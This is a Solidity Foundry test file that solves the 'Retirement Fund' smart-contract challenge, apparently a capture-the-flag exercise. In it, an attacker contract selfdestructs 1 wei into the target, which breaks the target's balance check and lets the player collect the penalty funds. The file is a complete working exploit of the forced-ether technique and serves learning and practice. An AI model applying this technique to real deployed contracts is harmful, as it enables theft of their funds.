// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";
import "../../src/math/3.sol";
import "forge-std/console.sol";


contract RetirementFundAttacker {

    constructor () payable {
        require(msg.value > 0);
        
    }
    function destroy( address payable addr) public {
        selfdestruct(addr);
    }
}

contract RetirementFundChallengeTest is Test {
    RetirementFundChallenge target;
    RetirementFundAttacker attacker;
    address player;
    function setUp() public {
        player = vm.addr(1);
        vm.deal(player, 100 ether);
        target = new RetirementFundChallenge{value: 1 ether}(player);
        attacker = new RetirementFundAttacker{value: 1 wei}();
        attacker.destroy(payable(address(target)));
    }

    function testComplete() public {
        vm.startPrank(player);
        target.collectPenalty();
        emit log_named_uint("balance", address(target).balance);
        assertTrue(target.isComplete());
    }
}